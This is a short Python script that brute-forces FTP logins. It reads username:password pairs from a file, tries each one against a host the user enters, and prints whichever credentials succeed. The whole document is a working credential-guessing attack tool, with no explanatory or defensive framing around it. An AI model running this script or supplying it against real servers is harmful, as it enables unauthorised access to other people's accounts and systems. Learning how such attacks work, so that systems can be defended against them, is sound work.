import ftplib
from termcolor import colored

def bruteLogin(hostname,passwordFile):
    try:
        pF = open(passwordFile,'r')
    except:
        print("File Does not exist")
    
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip()
        print(userName,passWord)
    
        try:
            ftp= ftplib.FTP(hostname)
            login = ftp.login(userName,passWord)
            print(colored("login succesful with username:",'green'),userName,colored("and password:",'green'),passWord)
            return(userName,passWord)
        except:
            pass
    print(colored("Password not in the list",'red'))


hostname = input(colored('Enter the IP address of the Host','magenta'))
passwordFile = input(colored('enter the location of password file','magenta'))
bruteLogin(hostname,passwordFile)
